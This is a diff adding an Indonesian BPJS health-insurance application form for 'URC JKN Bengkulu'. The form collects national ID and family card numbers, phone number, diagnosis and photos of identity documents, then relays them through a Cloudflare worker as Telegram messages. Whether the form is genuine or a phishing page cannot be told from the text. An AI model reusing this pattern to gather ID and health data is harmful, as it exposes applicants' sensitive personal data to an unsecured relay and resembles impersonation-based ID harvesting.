@@ -1,0 +1,472 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Form Pengajuan BPJS</title>
+
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    :root{
+      --pad: 8px; /* ✅ diperkecil biar lebih lebar */
+    }
+
+    body{
+      background:linear-gradient(135deg,#0052A0,#003B73);
+      min-height:100vh;     /* fallback */
+      min-height:100svh;    /* viewport unit modern */
+      padding:
+        calc(var(--pad) + env(safe-area-inset-top))
+        calc(var(--pad) + env(safe-area-inset-right))
+        calc(var(--pad) + env(safe-area-inset-bottom))
+        calc(var(--pad) + env(safe-area-inset-left));
+    }
+
+    /* ✅ full di HP, lebih luas di tablet */
+    .app-shell{width:100%;max-width:720px;}
+    @media (max-width:576px){
+      .app-shell{max-width:100%;}
+    }
+
+    .bpjs-header{background:linear-gradient(135deg,#0052A0,#003B73);border-bottom:4px solid #FFD700;}
+
+    .hint{font-size:.85rem;color:#64748b;}
+    .upload-box{border:2px dashed #0d6efd;background:#f8fafc;border-radius:16px;padding:14px;}
+
+    .preview-item{position:relative;width:100%;aspect-ratio:1/1;border-radius:14px;overflow:hidden;border:1px solid #e2e8f0;background:#fff;}
+    .preview-item img{width:100%;height:100%;object-fit:cover;display:block;}
+    .remove-btn{position:absolute;top:8px;right:8px;width:30px;height:30px;border-radius:999px;border:none;background:#dc2626;color:#fff;font-weight:900;display:flex;align-items:center;justify-content:center;opacity:.95;cursor:pointer;}
+    .modal-backdrop.show{opacity:.55;}
+
+    /* Tinggi input ditambah */
+    .form-floating > .form-control{
+      min-height:62px;
+      padding-top:1.25rem;
+      padding-bottom:.7rem;
+    }
+    .form-floating > textarea.form-control{
+      min-height:150px;
+    }
+
+    /* ✅ Label: awal transparan, saat isi/focus jadi lebih gelap */
+    .form-floating > label{
+      color: rgba(15, 23, 42, .42);
+      font-weight:600;
+      transition: color .15s ease;
+    }
+    .form-floating > .form-control:focus ~ label,
+    .form-floating > .form-control:not(:placeholder-shown) ~ label,
+    .form-floating > textarea.form-control:focus ~ label,
+    .form-floating > textarea.form-control:not(:placeholder-shown) ~ label{
+      color: rgba(15, 23, 42, .88);
+    }
+  </style>
+</head>
+
+<body>
+  <!-- ✅ container-fluid dihilangkan biar gak tambah padding -->
+  <div class="d-flex justify-content-center px-0">
+    <div class="app-shell">
+
+      <div class="card shadow-lg border-0 rounded-4 overflow-hidden">
+        <div class="bpjs-header text-white text-center p-4">
+          <h1 class="h5 fw-bold mb-1">Form Pengajuan BPJS</h1>
+          <div class="small opacity-75">URC JKN Bengkulu</div>
+        </div>
+
+        <!-- ✅ padding HP diperkecil -->
+        <div class="card-body bg-light p-2 p-sm-4">
+          <div class="alert alert-primary border-0 rounded-4 mb-3">
+            <div class="small">Pastikan data sesuai KTP/KK. NIK & KK wajib 16 digit angka.</div>
+          </div>
+
+          <form id="form" class="needs-validation" novalidate>
+
+            <div class="card rounded-4 mb-3">
+              <!-- ✅ padding isi card sedikit diperkecil -->
+              <div class="card-body p-3 p-sm-4">
+                <div class="fw-bold text-primary mb-3">🧾 Identitas Pasien</div>
+
+                <div class="form-floating mb-3">
+                  <input id="nama" type="text" class="form-control rounded-4" placeholder="Nama" required>
+                  <label for="nama">Nama</label>
+                  <div class="invalid-feedback">Nama wajib diisi.</div>
+                </div>
+
+                <div class="form-floating mb-3">
+                  <input id="nik" type="tel" inputmode="numeric" maxlength="16"
+                         class="form-control rounded-4" placeholder="No NIK" required>
+                  <label for="nik">No NIK (16 digit)</label>
+                  <div class="invalid-feedback">NIK harus 16 digit angka.</div>
+                </div>
+
+                <div class="form-floating mb-3">
+                  <input id="kk" type="tel" inputmode="numeric" maxlength="16"
+                         class="form-control rounded-4" placeholder="No KK" required>
+                  <label for="kk">No KK (16 digit)</label>
+                  <div class="invalid-feedback">No KK harus 16 digit angka.</div>
+                </div>
+
+                <div class="form-floating mb-3">
+                  <input id="umur" type="tel" inputmode="numeric"
+                         class="form-control rounded-4" placeholder="Umur" required>
+                  <label for="umur">Umur</label>
+                  <div class="invalid-feedback">Umur wajib diisi.</div>
+                </div>
+
+                <div class="form-floating mb-3">
+                  <input id="hp" type="tel" inputmode="numeric" maxlength="13"
+                         class="form-control rounded-4" placeholder="No HP" required>
+                  <label for="hp">Masukkan No HP aktif</label>
+                  <div class="invalid-feedback">No HP tidak valid.</div>
+                </div>
+
+                <div class="form-floating mb-3">
+                  <textarea id="diagnosa" class="form-control rounded-4" placeholder="Diagnosa" required></textarea>
+                  <label for="diagnosa">Diagnosa Penyakit</label>
+                  <div class="invalid-feedback">Diagnosa wajib diisi.</div>
+                </div>
+
+                <div class="form-floating mb-0">
+                  <input id="puskesmas" type="text" class="form-control rounded-4"
+                         placeholder="Puskesmas" required>
+                  <label for="puskesmas">Puskesmas terdekat</label>
+                  <div class="invalid-feedback">Puskesmas wajib diisi.</div>
+                </div>
+              </div>
+            </div>
+
+            <div class="card rounded-4 mb-3">
+              <div class="card-body p-3 p-sm-4">
+                <div class="fw-bold text-primary mb-2">📎 Upload Berkas Pendukung</div>
+
+                <div class="hint">
+                  <div class="fw-semibold text-dark mb-1">Berkas pendukung:</div>
+                  <ul class="mb-2">
+                    <li>KTP</li>
+                    <li>KK</li>
+                    <li>Surat Keterangan Tidak Mampu (SKTM)</li>
+                    <li>Surat Rawat Inap</li>
+                  </ul>
+                  <div><span class="fw-semibold text-dark">Catatan:</span> Upload foto yang jelas terbaca (JPG/PNG).</div>
+                </div>
+
+                <div class="upload-box mt-3">
+                  <div class="text-center">
+                    <div class="fw-bold">Tambahkan Foto Berkas</div>
+                    <div class="small text-secondary">Pilih dari galeri atau ambil langsung dari kamera</div>
+                  </div>
+
+                  <input type="file" id="fileGallery" multiple accept="image/*" class="d-none">
+                  <input type="file" id="fileCamera"  multiple accept="image/*" capture="environment" class="d-none">
+
+                  <div class="row g-2 mt-3">
+                    <div class="col-6">
+                      <button type="button" id="btnCamera" class="btn btn-outline-secondary w-100 rounded-4 py-3">📷 Kamera</button>
+                    </div>
+                    <div class="col-6">
+                      <button type="button" id="btnGallery" class="btn btn-outline-secondary w-100 rounded-4 py-3">🖼️ Galeri</button>
+                    </div>
+                  </div>
+
+                  <div class="row g-2 mt-3" id="previewRow"></div>
+                </div>
+
+                <div class="form-text mt-2">Minimal upload 1 foto berkas pendukung.</div>
+              </div>
+            </div>
+
+            <div class="row g-2">
+              <div class="col-6">
+                <button type="button" id="resetBtn" class="btn btn-light w-100 rounded-4 py-3 border">Reset</button>
+              </div>
+              <div class="col-6">
+                <button type="submit" id="submitBtn" class="btn btn-primary w-100 rounded-4 py-3 fw-bold">Kirim</button>
+              </div>
+            </div>
+
+            <div id="result" class="alert mt-3 rounded-4 d-none" role="alert"></div>
+          </form>
+        </div>
+
+        <div class="card-footer text-center small text-secondary bg-white">
+          © 2026 BPJS URC JKN Bengkulu
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Loading Modal -->
+  <div class="modal fade" id="loadingModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content rounded-4">
+        <div class="modal-body text-center p-4">
+          <div class="spinner-border text-primary" role="status" aria-hidden="true"></div>
+          <div class="fw-bold mt-3" id="loadingTitle">Sedang mengirim pengajuan...</div>
+          <div class="text-secondary small mt-1" id="loadingSub">Mohon tunggu, jangan tutup halaman.</div>
+          <div class="progress mt-3" style="height:8px;">
+            <div class="progress-bar" id="progressBar" style="width:0%"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+
+  <script>
+    const WORKER_URL = "https://odd-cell-7726.jerkaijerkai1.workers.dev/";
+
+    const form = document.getElementById("form");
+    const result = document.getElementById("result");
+
+    const namaEl = document.getElementById("nama");
+    const nikEl = document.getElementById("nik");
+    const kkEl = document.getElementById("kk");
+    const umurEl = document.getElementById("umur");
+    const hpEl = document.getElementById("hp");
+    const diagnosaEl = document.getElementById("diagnosa");
+    const puskesmasEl = document.getElementById("puskesmas");
+
+    const fileGallery = document.getElementById("fileGallery");
+    const fileCamera  = document.getElementById("fileCamera");
+    const btnGallery  = document.getElementById("btnGallery");
+    const btnCamera   = document.getElementById("btnCamera");
+    const previewRow  = document.getElementById("previewRow");
+
+    const resetBtn = document.getElementById("resetBtn");
+    const submitBtn = document.getElementById("submitBtn");
+
+    const loadingModalEl = document.getElementById("loadingModal");
+    const loadingModal = new bootstrap.Modal(loadingModalEl, { backdrop: "static", keyboard: false });
+    const loadingTitle = document.getElementById("loadingTitle");
+    const loadingSub = document.getElementById("loadingSub");
+    const progressBar = document.getElementById("progressBar");
+
+    let files = [];
+    let isSubmitting = false;
+
+    function onlyDigits(el){ el.value = el.value.replace(/[^0-9]/g,''); }
+    [nikEl, kkEl, umurEl, hpEl].forEach(el => el.addEventListener("input", ()=>onlyDigits(el)));
+    namaEl.addEventListener("input", ()=>{ namaEl.value = namaEl.value.toUpperCase(); });
+
+    function showAlert(kind, msg){
+      result.className = "alert mt-3 rounded-4";
+      result.classList.add(kind === "success" ? "alert-success" : "alert-danger");
+      result.textContent = msg;
+      result.classList.remove("d-none");
+      setTimeout(()=> result.classList.add("d-none"), 9000);
+    }
+
+    function setLoading(show, title, sub, pct){
+      if(show){
+        loadingTitle.textContent = title || "Sedang mengirim pengajuan...";
+        loadingSub.textContent = sub || "Mohon tunggu, jangan tutup halaman.";
+        progressBar.style.width = (pct ?? 0) + "%";
+        loadingModal.show();
+      }else{
+        loadingModal.hide();
+      }
+    }
+
+    function renderPreview(){
+      previewRow.innerHTML = "";
+      files.forEach((file, idx)=>{
+        const col = document.createElement("div");
+        col.className = "col-4";
+
+        const box = document.createElement("div");
+        box.className = "preview-item";
+
+        const img = document.createElement("img");
+        img.alt = "Berkas";
+
+        const btn = document.createElement("button");
+        btn.type = "button";
+        btn.className = "remove-btn";
+        btn.textContent = "×";
+        btn.addEventListener("click", ()=>{
+          files.splice(idx,1);
+          renderPreview();
+        });
+
+        const reader = new FileReader();
+        reader.onload = (e)=> img.src = e.target.result;
+        reader.readAsDataURL(file);
+
+        box.appendChild(img);
+        box.appendChild(btn);
+        col.appendChild(box);
+        previewRow.appendChild(col);
+      });
+    }
+
+    function addFiles(picked){
+      picked.forEach(f=>{
+        if(!f.type.startsWith("image/")) return;
+        if(f.size > 10 * 1024 * 1024) return;
+        files.push(f);
+      });
+      renderPreview();
+    }
+
+    btnGallery.addEventListener("click", ()=> fileGallery.click());
+    btnCamera.addEventListener("click", ()=> fileCamera.click());
+
+    fileGallery.addEventListener("change", (e)=>{ addFiles(Array.from(e.target.files || [])); fileGallery.value=""; });
+    fileCamera.addEventListener("change", (e)=>{ addFiles(Array.from(e.target.files || [])); fileCamera.value=""; });
+
+    resetBtn.addEventListener("click", ()=>{
+      if(files.length && !confirm("Reset semua data?")) return;
+      form.reset();
+      files = [];
+      renderPreview();
+      result.classList.add("d-none");
+      form.classList.remove("was-validated");
+    });
+
+    function getTimestampWIB(){
+      const d = new Date();
+      const parts = new Intl.DateTimeFormat("id-ID", {
+        timeZone: "Asia/Jakarta",
+        year:"numeric", month:"2-digit", day:"2-digit",
+        hour:"2-digit", minute:"2-digit", second:"2-digit",
+        hour12:false
+      }).formatToParts(d);
+      const m = {};
+      parts.forEach(p => m[p.type]=p.value);
+      return `${m.day}-${m.month}-${m.year} ${m.hour}:${m.minute}:${m.second} WIB`;
+    }
+
+    function buildTelegramMessage(){
+      const ts = getTimestampWIB();
+      return [
+        "🏥 *FORM BPJS - URC JKN BENGKULU*",
+        `🕒 Waktu Pengajuan: *${ts}*`,
+        "",
+        "👤 *Identitas Pasien*",
+        `• Nama: *${namaEl.value.trim()}*`,
+        `• NIK: *${nikEl.value}*`,
+        `• KK: *${kkEl.value}*`,
+        `• Umur: *${umurEl.value}*`,
+        `• No HP: *${hpEl.value}*`,
+        "",
+        "🩺 *Kesehatan*",
+        `• Diagnosa: ${diagnosaEl.value.trim()}`,
+        `• Puskesmas Terdekat: ${puskesmasEl.value.trim()}`,
+        "",
+        "📎 *Berkas*",
+        `• Jumlah Foto: *${files.length}*`
+      ].join("\n");
+    }
+
+    function validateCustom(){
+      if(nikEl.value.length !== 16) return "NIK tidak valid.";
+      if(kkEl.value.length !== 16) return "No KK tidak valid.";
+      if(hpEl.value.length < 10 || hpEl.value.length > 13) return "No HP tidak valid.";
+      if(files.length === 0) return "Upload minimal 1 foto berkas pendukung.";
+      return null;
+    }
+
+    function focusNext(el){
+      if(!el) return;
+      el.focus({preventScroll:true});
+      setTimeout(()=> el.scrollIntoView({behavior:"smooth", block:"center"}), 50);
+    }
+
+    const order = [namaEl, nikEl, kkEl, umurEl, hpEl, diagnosaEl, puskesmasEl];
+    order.forEach((el, idx)=>{
+      el.addEventListener("keydown", (e)=>{
+        if(e.key === "Enter" && el.tagName !== "TEXTAREA"){
+          e.preventDefault();
+          focusNext(order[idx+1]);
+        }
+      });
+    });
+
+    nikEl.addEventListener("input", ()=>{ if(nikEl.value.length === 16) focusNext(kkEl); });
+    kkEl.addEventListener("input", ()=>{ if(kkEl.value.length === 16) focusNext(umurEl); });
+
+    form.addEventListener("submit", async (e)=>{
+      e.preventDefault();
+      e.stopPropagation();
+
+      if(!form.checkValidity()){
+        form.classList.add("was-validated");
+        return;
+      }
+
+      const customErr = validateCustom();
+      if(customErr){
+        showAlert("error", "❌ " + customErr);
+        return;
+      }
+
+      if(isSubmitting) return;
+      isSubmitting = true;
+
+      submitBtn.disabled = true;
+      resetBtn.disabled = true;
+      btnCamera.disabled = true;
+      btnGallery.disabled = true;
+
+      const totalSteps = 1 + files.length;
+      let done = 0;
+
+      try{
+        setLoading(true, "Sedang mengirim pengajuan...", "Mengirim data identitas...", 5);
+
+        const textData = new FormData();
+        textData.append("type","text");
+        textData.append("message", buildTelegramMessage());
+
+        const textRes = await fetch(WORKER_URL, { method:"POST", body:textData });
+        if(!textRes.ok) throw new Error("Gagal mengirim data.");
+
+        done++;
+        setLoading(true, "Sedang mengirim pengajuan...", "Mengunggah berkas pendukung...", Math.round(done/totalSteps*100));
+
+        for(let i=0;i<files.length;i++){
+          loadingSub.textContent = `Mengunggah berkas ${i+1} dari ${files.length}...`;
+
+          const photoData = new FormData();
+          photoData.append("type","photo");
+          photoData.append("photo", files[i]);
+          photoData.append("caption", `Berkas ${i+1} - ${namaEl.value.trim()}`);
+
+          const photoRes = await fetch(WORKER_URL, { method:"POST", body:photoData });
+          if(!photoRes.ok) throw new Error("Gagal mengunggah berkas.");
+
+          done++;
+          progressBar.style.width = Math.round(done/totalSteps*100) + "%";
+        }
+
+        setLoading(false);
+
+        showAlert("success",
+          "✅ Pengajuan berhasil dikirim. Tim URC JKN Bengkulu akan menghubungi Anda melalui WhatsApp/telepon untuk verifikasi dan tindak lanjut."
+        );
+
+        setTimeout(()=>{
+          form.reset();
+          form.classList.remove("was-validated");
+          files = [];
+          renderPreview();
+        }, 1200);
+
+      }catch(err){
+        setLoading(false);
+        showAlert("error", "❌ " + (err?.message || "Terjadi kesalahan saat mengirim."));
+      }finally{
+        isSubmitting = false;
+        submitBtn.disabled = false;
+        resetBtn.disabled = false;
+        btnCamera.disabled = false;
+        btnGallery.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
